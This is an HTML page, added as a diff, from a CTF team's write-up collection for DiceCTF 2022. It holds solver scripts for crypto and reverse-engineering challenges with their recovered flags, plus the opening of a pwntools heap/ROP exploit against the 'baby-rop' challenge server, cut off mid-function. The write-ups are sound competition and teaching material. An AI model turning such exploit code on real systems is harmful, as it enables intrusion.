@@ -1,0 +1,537 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>DiceCTF 2022</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pow-pow">pow-pow</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#hyperlink">hyperlink</a>
+    
+                <a class="dropdown-item" href="#taxes">taxes</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#baby-rop">baby-rop</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#pow-pow" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pow-pow</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#hyperlink" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">hyperlink</span>
+            </a>
+    
+<a href="#taxes" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">taxes</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#baby-rop" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">baby-rop</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="dicectf-2022"><a class="header-link" href="#dicectf-2022"></a>DiceCTF 2022</h1>
+<p>[TOC]</p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
+<h3 id="pow-pow"><a class="header-link" href="#pow-pow"></a>pow-pow</h3>
+<p><a href="https://gist.github.com/EricTsengTy/067d9abd0ea78debe01b862ac5ccc35f">https://gist.github.com/EricTsengTy/067d9abd0ea78debe01b862ac5ccc35f</a></p>
+<pre class="hljs"><code><span class="hljs-attribute">Find</span> b that
+    <span class="hljs-attribute">b</span>  =  <span class="hljs-number">2</span>^(<span class="hljs-number">2</span>^k)
+    <span class="hljs-attribute">h</span>  =  <span class="hljs-number">1</span>
+    <span class="hljs-attribute">g</span>  =  b^M
+    <span class="hljs-attribute">m</span>  =  H(g, h)
+<span class="hljs-attribute">s</span>.t.
+    <span class="hljs-attribute">m</span> | M
+<span class="hljs-attribute">then</span> we can get pi by
+    <span class="hljs-attribute">pi</span> =  b^(-(M // m) * r)
+<span class="hljs-attribute">where</span> r = <span class="hljs-number">2</span>^(<span class="hljs-number">2</span>^<span class="hljs-number">64</span>) % m</code></pre><h2 id="rev"><a class="header-link" href="#rev"></a>rev</h2>
+<h3 id="hyperlink"><a class="header-link" href="#hyperlink"></a>hyperlink</h3>
+<pre class="hljs"><code>import json
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;hyperlink.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as f:
+    data = json.<span class="hljs-built_in">load</span>(f)
+
+charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz{}_&#x27;</span>
+
+def run_chain(links, start):
+    current = start
+    <span class="hljs-keyword">for</span> link <span class="hljs-built_in">in</span> links:
+        current = int(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(
+            <span class="hljs-built_in">str</span>(int(current &amp; component != <span class="hljs-number">0</span>))
+            <span class="hljs-keyword">for</span> component <span class="hljs-built_in">in</span> link
+        ), <span class="hljs-number">2</span>)
+    return current
+
+current = data[<span class="hljs-string">&#x27;start&#x27;</span>]
+<span class="hljs-built_in">flag</span> = <span class="hljs-string">&#x27;dice{&#x27;</span>
+chain = [data[<span class="hljs-string">&#x27;links&#x27;</span>][c] <span class="hljs-keyword">for</span> c <span class="hljs-built_in">in</span> <span class="hljs-built_in">flag</span>]
+current = run_chain(chain, data[<span class="hljs-string">&#x27;start&#x27;</span>])
+
+<span class="hljs-keyword">while</span> (current &amp; data[<span class="hljs-string">&#x27;target&#x27;</span>]) != data[<span class="hljs-string">&#x27;target&#x27;</span>] <span class="hljs-built_in">and</span> len(<span class="hljs-built_in">flag</span>) &lt; <span class="hljs-number">34</span>:
+    tmp = current
+    <span class="hljs-built_in">count</span> = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> (tmp &amp; <span class="hljs-number">1</span> == <span class="hljs-number">1</span>) <span class="hljs-built_in">or</span> (tmp &amp; <span class="hljs-number">2</span> == <span class="hljs-number">0</span>):
+        tmp &gt;&gt;= <span class="hljs-number">4</span>
+        <span class="hljs-built_in">count</span> += <span class="hljs-number">4</span>
+    candidate = []
+    <span class="hljs-keyword">for</span> c <span class="hljs-built_in">in</span> charset:
+        <span class="hljs-keyword">if</span> data[<span class="hljs-string">&#x27;links&#x27;</span>][c][-<span class="hljs-built_in">count</span>-<span class="hljs-number">1</span>] == (<span class="hljs-number">3</span> &lt;&lt; <span class="hljs-built_in">count</span>):
+            candidate.<span class="hljs-built_in">append</span>(c)
+    <span class="hljs-built_in">assert</span> len(candidate) == <span class="hljs-number">1</span>
+    chain = [data[<span class="hljs-string">&#x27;links&#x27;</span>][c] <span class="hljs-keyword">for</span> c <span class="hljs-built_in">in</span> candidate[<span class="hljs-number">0</span>]]
+    current = run_chain(chain, current)
+    <span class="hljs-built_in">flag</span> += candidate[<span class="hljs-number">0</span>]
+
+print(<span class="hljs-built_in">flag</span>)
+
+<span class="hljs-meta"># dice{everything_is_linear_algebra}</span></code></pre><h3 id="taxes"><a class="header-link" href="#taxes"></a>taxes</h3>
+<h4 id="dg4-a"><a class="header-link" href="#dg4-a"></a>DG4-A</h4>
+<pre class="hljs"><code>a = [68, 105, 99, 101, 71, 97, 110, 103, 27, 97, 110, 21, 101, 71, 28, 2]
+b = [45, 7, 23, 86, 53, 15, 90, 11, 68, 19, 93, 99, 0, 41, 105, 103]
+
+<span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> zip(a, b):
+    <span class="hljs-builtin-name">print</span>(chr(x ^ y), <span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attribute">flush</span>=<span class="hljs-literal">True</span>)
+<span class="hljs-builtin-name">print</span>()
+
+<span class="hljs-comment"># int3rn4l_r3venue</span></code></pre><h4 id="dg4-b"><a class="header-link" href="#dg4-b"></a>DG4-B</h4>
+<p><a href="https://gist.github.com/paulhuangkm/c4eff7e4388eb450b4a73fdd28086476">SCRIPT</a></p>
+<pre class="hljs"><code>_serv<span class="hljs-number">1</span>ce_<span class="hljs-name">m0</span>re_l<span class="hljs-number">1</span></code></pre><h4 id="dg4-c-dg6"><a class="header-link" href="#dg4-c-dg6"></a>DG4-C (DG6)</h4>
+<pre class="hljs"><code><span class="hljs-comment">// All credits to Jwang</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> S1 = <span class="hljs-number">7453001392616335684ULL</span>; <span class="hljs-comment">//low</span>
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> S2 = <span class="hljs-number">7451565559246643524ULL</span>; <span class="hljs-comment">//high</span>
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> T1_1 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> T1_2 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> T2_1 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> T2_2 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> x=<span class="hljs-number">0</span>;x&lt;<span class="hljs-number">1000000000000ULL</span>;x++){
+    <span class="hljs-keyword">if</span>((x%<span class="hljs-number">1000000000</span>)==<span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llu\n&quot;</span>,x);
+    T1_1 = (S1&gt;&gt;<span class="hljs-number">1</span>)|((S2&amp;<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">63</span>);
+    T1_2 = (S2&gt;&gt;<span class="hljs-number">1</span>)|((S1&amp;<span class="hljs-number">1</span>)&lt;&lt;<span class="hljs-number">63</span>);
+    T1_1|=S1;
+    T1_2|=S2;
+    T2_1 = (S1&lt;&lt;<span class="hljs-number">1</span>)|(S2&gt;&gt;<span class="hljs-number">63</span>);
+    T2_2 = (S2&lt;&lt;<span class="hljs-number">1</span>)|(S1&gt;&gt;<span class="hljs-number">63</span>);
+    S1 = T1_1^T2_1;
+    S2 = T1_2^T2_2;
+  }
+  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llu %llu&quot;</span>,S2,S1);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+
+<span class="hljs-comment">// ke_ink_rev3rs1ng</span></code></pre><h4 id="dg4-d-dg7"><a class="header-link" href="#dg4-d-dg7"></a>DG4-D (DG7)</h4>
+<pre class="hljs"><code>As = [<span class="hljs-number">343039</span>,<span class="hljs-number">2733569919</span>,<span class="hljs-number">3492393040</span>,<span class="hljs-number">912986159</span>,<span class="hljs-number">2320019439</span>,<span class="hljs-number">1372387751</span>,
+<span class="hljs-number">2734051748</span>,<span class="hljs-number">4183136871</span>,<span class="hljs-number">4131490973</span>,<span class="hljs-number">3331550901</span>,<span class="hljs-number">4039091427</span>,<span class="hljs-number">2011829293</span>,
+<span class="hljs-number">4064521974</span>,<span class="hljs-number">2542382404</span>,<span class="hljs-number">662680445</span>,<span class="hljs-number">4244429757</span>,<span class="hljs-number">1907156173</span>,<span class="hljs-number">3140073386</span>,
+<span class="hljs-number">1726859438</span>,<span class="hljs-number">1527969902</span>,<span class="hljs-number">3860913000</span>,<span class="hljs-number">2876239582</span>,<span class="hljs-number">2799116963</span>,<span class="hljs-number">1608231135</span>,
+<span class="hljs-number">2396613870</span>,<span class="hljs-number">3548248332</span>,<span class="hljs-number">3068050105</span>,<span class="hljs-number">2024408303</span>,<span class="hljs-number">4100972441</span>,<span class="hljs-number">2407182277</span>,
+<span class="hljs-number">1794763355</span>,<span class="hljs-number">3196154075</span>,<span class="hljs-number">3732239213</span>,<span class="hljs-number">394919766</span>,<span class="hljs-number">2197149293</span>,<span class="hljs-number">3185198778</span>,
+<span class="hljs-number">3952881150</span>,<span class="hljs-number">3885164379</span>,<span class="hljs-number">234597444</span>,<span class="hljs-number">642322623</span>,<span class="hljs-number">3528601129</span>,<span class="hljs-number">3969777425</span>,
+<span class="hljs-number">2075901355</span>,<span class="hljs-number">2546415827</span>,<span class="hljs-number">4029539571</span>,<span class="hljs-number">2740974388</span>,<span class="hljs-number">2756514805</span>,<span class="hljs-number">4149925230</span>,
+<span class="hljs-number">319648567</span>,<span class="hljs-number">1622441043</span>,<span class="hljs-number">431984786</span>,<span class="hljs-number">1313540411</span>,<span class="hljs-number">4240996349</span>,<span class="hljs-number">3021682383</span>,
+<span class="hljs-number">3873385171</span>,<span class="hljs-number">3217995502</span>,<span class="hljs-number">2130511546</span>,<span class="hljs-number">347240441</span>,<span class="hljs-number">3504272675</span>,<span class="hljs-number">1852839691</span>,
+<span class="hljs-number">4198741748</span>,<span class="hljs-number">384402019</span>,<span class="hljs-number">1073674067</span>,<span class="hljs-number">2308274366</span>,<span class="hljs-number">1649593849</span>,<span class="hljs-number">1580693221</span>,
+<span class="hljs-number">1891223314</span>,<span class="hljs-number">4277757085</span>,<span class="hljs-number">356677631</span>,<span class="hljs-number">3587165417</span>,<span class="hljs-number">785852082</span>,<span class="hljs-number">1844099611</span>,
+<span class="hljs-number">2096069838</span>,<span class="hljs-number">2075488364</span>,<span class="hljs-number">635386633</span>,<span class="hljs-number">3098228429</span>,<span class="hljs-number">3426412026</span>,<span class="hljs-number">694611443</span>,
+<span class="hljs-number">1308405653</span>,<span class="hljs-number">3435931359</span>,<span class="hljs-number">3870904043</span>,<span class="hljs-number">3193145087</span>,<span class="hljs-number">1325367455</span>,<span class="hljs-number">3757926298</span>,
+<span class="hljs-number">2069475259</span>,<span class="hljs-number">2255190751</span>,<span class="hljs-number">1845093732</span>,<span class="hljs-number">2805545695</span>,<span class="hljs-number">2943133433</span>,<span class="hljs-number">1824259504</span>,
+<span class="hljs-number">2142133580</span>,<span class="hljs-number">2644404398</span>,<span class="hljs-number">430366110</span>,<span class="hljs-number">2010343702</span>,<span class="hljs-number">2379982082</span>,<span class="hljs-number">4196354527</span>,
+<span class="hljs-number">4267409331</span>,<span class="hljs-number">2765708970</span>,<span class="hljs-number">3187365580</span>,<span class="hljs-number">1831014719</span>,<span class="hljs-number">2980964048</span>,<span class="hljs-number">3155948591</span>,
+<span class="hljs-number">1474999319</span>,<span class="hljs-number">3019402471</span>,<span class="hljs-number">3811335997</span>,<span class="hljs-number">2886197802</span>,<span class="hljs-number">2478524056</span>,<span class="hljs-number">1563617651</span>,
+<span class="hljs-number">2361875522</span>,<span class="hljs-number">691797586</span>,<span class="hljs-number">2011659610</span>,<span class="hljs-number">232149174</span>,<span class="hljs-number">1825673179</span>,<span class="hljs-number">1093592609</span>,
+<span class="hljs-number">822015370</span>,<span class="hljs-number">4000387228</span>,<span class="hljs-number">4160386814</span>,<span class="hljs-number">2911296421</span>,<span class="hljs-number">4067921206</span>,<span class="hljs-number">3662955519</span>,
+<span class="hljs-number">4183412649</span>,<span class="hljs-number">1714940895</span>,<span class="hljs-number">1804170151</span>,<span class="hljs-number">2146074317</span>,<span class="hljs-number">4265857463</span>,<span class="hljs-number">1748298979</span>,
+<span class="hljs-number">2448886932</span>,<span class="hljs-number">4276199443</span>,<span class="hljs-number">1525903074</span>,<span class="hljs-number">970392251</span>,<span class="hljs-number">1340077627</span>,<span class="hljs-number">3553265758</span>,
+<span class="hljs-number">4071857050</span>,<span class="hljs-number">3428769418</span>,<span class="hljs-number">422692964</span>,<span class="hljs-number">3711627571</span>,<span class="hljs-number">1215623161</span>,<span class="hljs-number">1342152068</span>,
+<span class="hljs-number">2008517966</span>,<span class="hljs-number">2615766190</span>,<span class="hljs-number">3174211036</span>,<span class="hljs-number">84635794</span>,<span class="hljs-number">1811810082</span>,<span class="hljs-number">4242345917</span>,
+<span class="hljs-number">4211381217</span>,<span class="hljs-number">1544282103</span>,<span class="hljs-number">4226339213</span>,<span class="hljs-number">2646887223</span>,<span class="hljs-number">1238817226</span>,<span class="hljs-number">1765229974</span>,
+<span class="hljs-number">2650691895</span>,<span class="hljs-number">934669108</span>,<span class="hljs-number">4088930102</span>,<span class="hljs-number">1827990831</span>,<span class="hljs-number">322129065</span>,<span class="hljs-number">1570925947</span>,
+<span class="hljs-number">4140256803</span>,<span class="hljs-number">3782718380</span>,<span class="hljs-number">4219345613</span>,<span class="hljs-number">2010167885</span>,<span class="hljs-number">714423230</span>,<span class="hljs-number">2842032436</span>,
+<span class="hljs-number">2482890916</span>,<span class="hljs-number">4079113151</span>,<span class="hljs-number">3988776550</span>,<span class="hljs-number">3718830182</span>,<span class="hljs-number">2608739728</span>,<span class="hljs-number">3651564519</span>,
+<span class="hljs-number">3956746680</span>,<span class="hljs-number">1965976605</span>,<span class="hljs-number">2310035390</span>,<span class="hljs-number">1878613359</span>,<span class="hljs-number">3745949280</span>,<span class="hljs-number">3662274430</span>,
+<span class="hljs-number">937860498</span>,<span class="hljs-number">3730106990</span>,<span class="hljs-number">17759318</span>,<span class="hljs-number">3799514325</span>,<span class="hljs-number">3436051645</span>,<span class="hljs-number">2614409852</span>,
+<span class="hljs-number">3745109800</span>,<span class="hljs-number">2606620258</span>,<span class="hljs-number">221604262</span>,<span class="hljs-number">4231217596</span>,<span class="hljs-number">4016557533</span>,<span class="hljs-number">1254453423</span>,
+<span class="hljs-number">1473231509</span>,<span class="hljs-number">1888270285</span>,<span class="hljs-number">3442580406</span>,<span class="hljs-number">3061638831</span>,<span class="hljs-number">2481107534</span>,<span class="hljs-number">4294244799</span>,
+<span class="hljs-number">4234455904</span>,<span class="hljs-number">514456518</span>,<span class="hljs-number">855137327</span>,<span class="hljs-number">3688592311</span>,<span class="hljs-number">970897802</span>,<span class="hljs-number">1765712340</span>,
+<span class="hljs-number">3218843744</span>,<span class="hljs-number">1066530491</span>,<span class="hljs-number">3059857109</span>,<span class="hljs-number">587069669</span>,<span class="hljs-number">997953869</span>,<span class="hljs-number">4200885116</span>,
+<span class="hljs-number">371843045</span>,<span class="hljs-number">330774306</span>,<span class="hljs-number">3278820337</span>,<span class="hljs-number">1073515613</span>,<span class="hljs-number">1926869885</span>,<span class="hljs-number">3444893756</span>,
+<span class="hljs-number">3618851621</span>,<span class="hljs-number">3257098035</span>,<span class="hljs-number">913061864</span>,<span class="hljs-number">718795725</span>,<span class="hljs-number">2766649823</span>,<span class="hljs-number">3016551502</span>,
+<span class="hljs-number">3939630008</span>,<span class="hljs-number">3798815605</span>]
+
+<span class="hljs-keyword">A</span> = <span class="hljs-number">0</span>
+for a in As:
+    <span class="hljs-keyword">A</span> &lt;&lt;= <span class="hljs-number">32</span>
+    <span class="hljs-keyword">A</span> += a
+
+FLAG = &#x27;&#x27;
+
+def enc(b):
+    B = <span class="hljs-number">0</span>
+    for c in b[::-<span class="hljs-number">1</span>]:
+        B *= <span class="hljs-number">128</span>
+        B += c
+    return B
+
+def dec(B):
+    b = b&#x27;&#x27;
+    while B != <span class="hljs-number">0</span>:
+        b += (B &amp; <span class="hljs-number">127</span>).to_bytes(<span class="hljs-number">1</span>, byteorder=&#x27;little&#x27;)
+        B &gt;&gt;= <span class="hljs-number">7</span>
+    return b
+
+def DG7(A1,B1):
+    P29 = <span class="hljs-number">1</span>
+    count = <span class="hljs-number">0</span>
+    while P29 != <span class="hljs-number">0</span>:
+        count += <span class="hljs-number">1</span>
+        P5 = A1 &amp; <span class="hljs-number">3</span>
+        if P5 == <span class="hljs-number">0</span>: # end
+            P82 = B1
+            P29 = <span class="hljs-number">0</span>
+        elif P5 == <span class="hljs-number">1</span>: # push to stack
+            P29 = A1 &gt;&gt; <span class="hljs-number">9</span>
+            P82 = (B1 &lt;&lt; <span class="hljs-number">7</span>) + ((A1 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">127</span>)
+        elif P5 == <span class="hljs-number">2</span>: # check if top of stack is <span class="hljs-number">0</span>
+            if B1 &amp; <span class="hljs-number">127</span> == <span class="hljs-number">0</span>:
+                P29 = A1 &gt;&gt; <span class="hljs-number">2</span>
+                P82 = B1
+            else:
+                P29 = <span class="hljs-number">0</span>
+                P82 = <span class="hljs-number">0</span>
+        else: # arithmetic operation on top <span class="hljs-number">2</span> of stack
+            P29 = A1 &gt;&gt; <span class="hljs-number">4</span>
+            P55 = (A1 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>
+            P61 = (B1 &gt;&gt; <span class="hljs-number">14</span>) &lt;&lt; <span class="hljs-number">7</span>
+
+            # top <span class="hljs-number">2</span> elements on stack
+            P62 = B1 &amp; <span class="hljs-number">127</span>
+            P64 = (B1 &gt;&gt; <span class="hljs-number">7</span>) &amp; <span class="hljs-number">127</span>
+            if P55 == <span class="hljs-number">0</span>:
+                P82 = P61 + ((P64 + P62) &amp; <span class="hljs-number">127</span>)
+            elif P55 == <span class="hljs-number">1</span>:
+                P82 = P61 + ((P64 - P62) &amp; <span class="hljs-number">127</span>)
+            elif P55 == <span class="hljs-number">2</span>:
+                P82 = P61 + ((P64 * P62) &amp; <span class="hljs-number">127</span>)
+            else:
+                P82 = P61 + ((P64 ^ P62) &amp; <span class="hljs-number">127</span>)
+
+        A1 = P29
+        B1 = P82
+    return count
+
+while len(FLAG) &lt; <span class="hljs-number">16</span>:
+    charset = &#x27;&#x27;.join(chr(c) for c in range(<span class="hljs-number">32</span>, <span class="hljs-number">128</span>))
+    for char in charset:
+        INP = (FLAG.encode() + char.encode()).ljust(<span class="hljs-number">16</span>, b&#x27;a&#x27;)
+        N = enc(INP)
+
+        if DG7(<span class="hljs-keyword">A</span>, N) &gt; <span class="hljs-number">68</span> * (len(FLAG) + <span class="hljs-number">1</span>):
+            FLAG += char
+            print(char, end=&#x27;&#x27;, flush=True)
+
+print()
+
+# _simul4ti0n_lmao</code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>pwn</h2>
+<h3 id="baby-rop"><a class="header-link" href="#baby-rop"></a>baby-rop</h3>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+
+elf = ELF(<span class="hljs-string">&#x27;./babyrop&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)
+
+<span class="hljs-comment"># p = elf.process(env = {&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;})</span>
+p = remote(<span class="hljs-string">&#x27;mc.ax&#x27;</span>, <span class="hljs-number">31245</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span>(<span class="hljs-params">idx, <span class="hljs-built_in">len</span>, cont</span>):</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;command: &#x27;</span>)
+    p.sendline(<span class="hljs-string">b&#x27;C\n&#x27;</span> + <span class="hljs-built_in">str</span>(idx).encode() + <span class="hljs-string">b&#x27;\n&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>).encode())
+    p.recvuntil(<span class="hljs-string">b&#x27;string: &#x27;</span>)
+    p.send(cont)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;command: &#x27;</span>)
+    p.sendline(<span class="hljs-string">b&#x27;F\n&#x27;</span> + <span class="hljs-built_in">str</span>(idx).encode())
+    p.recvuntil(<span class="hljs-string">b&#x27;index: &#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">idx</span>):</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;command: &#x27;</span>)
+    p.sendline(<span class="hljs-string">b&#x27;R\n&#x27;</span> + <span class="hljs-built_in">str</span>(idx).encode())
+    p.recvuntil(<span class="hljs-string">b&#x27;index: &#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx, cont</span>):</span>
+    p.sendline(<span class="hljs-string">b&#x27;W\n&#x27;</span> + <span class="hljs-built_in">str</span>(idx).encode())
